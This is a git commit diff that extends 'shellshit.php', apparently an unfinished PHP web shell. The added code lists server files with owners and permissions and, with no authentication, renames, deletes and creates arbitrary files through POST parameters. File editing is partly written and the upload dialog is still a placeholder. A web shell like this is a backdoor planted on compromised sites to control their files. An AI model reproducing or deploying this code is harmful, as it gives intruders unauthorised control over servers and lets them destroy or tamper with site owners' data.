4197234bbc5fe16705aa982eb08c83eac65e6dff
r4mzz <mrkhld223@gmail.com>
2021-04-22 19:32:51 +0700

    Update Belum jadi

--- shellshit.php
+++ shellshit.php
@@ -1,9 +1,16 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
+
     <title>ShellShit</title>
 </head>
 <body class="bg-dark">
@@ -21,6 +28,7 @@ function path() {
 	}
 	return $dir;
 }
+
 
 function hddsize($size) {
 	if($size >= 1073741824)
@@ -67,7 +75,63 @@ function getuser() {
 	return $user;
 }
 
+
+function filepermission($file){
+	$perms = fileperms($file);
+
+	switch ($perms & 0xF000) {
+		case 0xC000: // socket
+			$info = 's';
+			break;
+		case 0xA000: // symbolic link
+			$info = 'l';
+			break;
+		case 0x8000: // regular
+			$info = 'r';
+			break;
+		case 0x6000: // block special
+			$info = 'b';
+			break;
+		case 0x4000: // directory
+			$info = 'd';
+			break;
+		case 0x2000: // character special
+			$info = 'c';
+			break;
+		case 0x1000: // FIFO pipe
+			$info = 'p';
+			break;
+		default: // unknown
+			$info = 'u';
+	}
+
+	// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+			(($perms & 0x0800) ? 's' : 'x' ) :
+			(($perms & 0x0800) ? 'S' : '-'));
+
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+		    	(($perms & 0x0400) ? 's' : 'x' ) :
+			(($perms & 0x0400) ? 'S' : '-'));
+
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+       		        (($perms & 0x0200) ? 't' : 'x' ) :
+			(($perms & 0x0200) ? 'T' : '-'));
+	
+	return $info;
+	
+}
+
 // END FUNCTIONS ==================================================
+
 $serverhost =  $_SERVER['HTTP_HOST'];
 
 
@@ -195,6 +259,124 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 		</table>
 		
 
+		<?php
+
+		//RENAME FILE
+			if(isset($_POST['newfilename'], $_POST['oldfilename'])){
+				rename($_POST['oldfilename'], $_POST['newfilename']);
+				?>
+						<div class="alert alert-warning alert-dismissible fade show" role="alert">
+						  <strong>Done !</strong> Filename Changed Successful !.
+						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+						    <span aria-hidden="true">&times;</span>
+						  </button>
+						</div>
+				<?php
+				
+			}
+		//DELETE FILE
+			elseif($_POST['filedelete']){
+				unlink($_POST['filedelete']);
+				rmdir($_POST['filedelete']);
+				?>
+						<div class="alert alert-danger alert-dismissible fade show" role="alert">
+						  <strong>Done !</strong>File/Dir Deleted Successful !.
+						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+						    <span aria-hidden="true">&times;</span>
+						  </button>
+						</div>
+				<?php
+			}
+		//MAKE NEW FILE OR DIR
+			elseif($_POST['newopsi']){
+				$opsi = $_POST['newopsi'];
+				if($opsi == 'File'){
+					fopen($_POST['makefile'], "w");
+				}elseif($opsi == 'Directory'){
+					mkdir(str_replace("'", "", $_POST['makefile']), 0777, true);
+				}
+				?>
+						<div class="alert alert-success alert-dismissible fade show" role="alert">
+						  <strong>Done !</strong>File/Dir Created Successful !.
+						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+						    <span aria-hidden="true">&times;</span>
+						  </button>
+						</div>
+				<?php
+			}
+		?>		
+		
+		<table>
+			<tr>
+				<td>
+					<!-- MAKE NEW FILE -->
+					<button type="button" class="btn btn-sm btn-primary mb-4" data-toggle="modal" data-target="#makeadd">
+					  Make File / Dir 
+					</button>
+
+					<!-- Modal -->
+					<div class="modal fade" id="makeadd" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+					  <div class="modal-dialog">
+					    <div class="modal-content">
+					      <div class="modal-header">
+						<h5 class="modal-title" id="exampleModalLabel">Make New File</h5>
+						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+						  <span aria-hidden="true">&times;</span>
+						</button>
+					      </div>
+					      <div class="modal-body">
+						
+					      <form method="POST">
+						<label>Choose Option </label>
+						<select class="form-control mb-3" name="newopsi">
+						  <option>File</option>
+						  <option>Directory</option>
+						</select>
+						<label>File / Dir Name </label>
+						<input type="text" class="form-control" name="makefile" placeholder="Enter File / Dir Name"/>
+						</div>
+						<div class="modal-footer">
+						<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+						<button type="submit" class="btn btn-primary">Save</button>
+						</form>
+					      </div>
+					    </div>
+					  </div>
+					</div>
+				</td>
+				<td>
+					<!-- UPLOAD FILE -->
+					<button type="button" class="btn btn-sm btn-success mb-4" data-toggle="modal" data-target="#uploadfile">
+					  Upload File
+					</button>
+
+					<!-- Modal -->
+					<div class="modal fade" id="uploadfile" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+					  <div class="modal-dialog">
+					    <div class="modal-content">
+					      <div class="modal-header">
+						<h5 class="modal-title" id="exampleModalLabel">Upload File</h5>
+						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+						  <span aria-hidden="true">&times;</span>
+						</button>
+					      </div>
+					      <div class="modal-body">
+						...
+					      </div>
+					      <div class="modal-footer">
+						<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+						<button type="button" class="btn btn-primary">Save changes</button>
+					      </div>
+					    </div>
+					  </div>
+					</div>
+				</td>
+			</tr>		
+		</table>
+		
+		
+	
+
 		<table class="table table-sm table-bordered">
 			<tr class="text-light bg-danger font-weight-bold">
 				<td>Name</td>
@@ -206,19 +388,123 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 				<td>Option</td>
 			</tr>
 			<?php 
+			
+
+
+
 			$directory = scandir(path());
+			
 				foreach($directory as $data){
+					
 					?>
 						<tr class="text-light">
 							<td><?php echo $data; ?></td>
-							<td></td>
-							<td></td>
-							<td></td>
-							<td></td>
-							<td></td>
+							<td><?php echo filetype($data); ?></td>
+							<td><?php echo filesize($data); ?></td>
+							<td><?php echo date ("F, d Y H:i:s",filemtime($data)); ?></td>
+							<td><?php echo posix_getpwuid(fileowner($data))['name'].'/'.posix_getpwuid(filegroup($data))['name']; ?></td>
+							<td><?php echo filepermission($data);?></td>
 							<td>
-								<button class="btn btn-danger btn-sm">Delete</button>
-								<button class="btn btn-primary btn-sm">Rename</button>
+								
+								<!-- RENAME OPTION -->
+								<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModal<?php echo str_replace('.', 'AABB', 									$data);?>">Rename
+								</button>
+								<!-- Modal Rename File -->
+								<div class="modal fade" id="exampleModal<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
+								  <div class="modal-dialog">
+								    <div class="modal-content text-dark">
+								      <div class="modal-header">
+									<h5 class="modal-title text-dark" id="exampleModalLabel">Rename <?php echo filetype($data); ?></h5>
+									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+									  <span aria-hidden="true">&times;</span>
+									</button>
+								      </div>
+								      <div class="modal-body">
+									<form method="POST">
+										<label>File Name</label>
+										<input type="text" class="form-control mb-3" name="oldfilename" value="<?php echo $data; ?>" readonly/>
+										<label>New File Name</label>
+										<input type="text" class="form-control" name="newfilename" placeholder="Enter New File Name"/>
+									
+								      </div>
+								      <div class="modal-footer">
+									<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+									<button type="submit" class="btn btn-primary">Save changes</button>
+									</form>
+								      </div>
+								    </div>
+								  </div>
+								</div>
+
+
+								
+
+
+								<!-- DELETE OPTION -->
+								<button type="button" class="btn btn-danger btn-sm" data-toggle="modal" data-target="#delete<?php echo str_replace('.', 'AABB', 									$data);?>">Delete
+								</button>
+								<!-- Modal Rename File -->
+								<div class="modal fade" id="delete<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
+								  <div class="modal-dialog">
+								    <div class="modal-content text-dark">
+								      <div class="modal-header">
+									<h5 class="modal-title text-dark" id="exampleModalLabel">Warning !</h5>
+									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+									  <span aria-hidden="true">&times;</span>
+									</button>
+								      </div>
+								      <div class="modal-body">
+									<p>Will you delete this <?php echo filetype($data); ?> ?</p>
+									<form method="POST">
+										<input type="hidden" name="filedelete" value="<?php echo $data; ?>"/>	
+								      </div>
+								      <div class="modal-footer">
+									<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+									<button type="submit" class="btn btn-danger">Continue</button>
+									</form>
+								      </div>
+								    </div>
+								  </div>
+								</div>
+								<?php
+								if(filetype($data) == 'file'){
+									?>
+									<!-- EDIT OPTION -->
+									<button type="button" class="btn btn-success btn-sm" data-toggle="modal" data-target="#edit<?php echo str_replace('.', 'AABB', $data);?>">Edit
+									</button>
+									<!-- Modal Rename File -->
+									<div class="modal fade" id="edit<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+									<div class="modal-dialog">
+										<div class="modal-content text-dark">
+										<div class="modal-header">
+										<h5 class="modal-title text-dark" id="exampleModalLabel">Edit File</h5>
+										<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+										<span aria-hidden="true">&times;</span>
+										</button>
+										</div>
+										<div class="modal-body">
+										<form method="POST">
+											<textarea rows="20" cols="" class="form-control" name="newtext">
+												<?php
+													$file = fopen($data, "r+");
+													
+												?>
+											</textarea>	
+										</div>
+										<div class="modal-footer">
+										<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+										<button type="submit" class="btn btn-danger">Continue</button>
+										</form>
+										</div>
+										</div>
+									</div>
+									</div>
+									
+									<?php
+								}
+								
+								
+								?>
 							</td>
 						</tr>
 					<?php
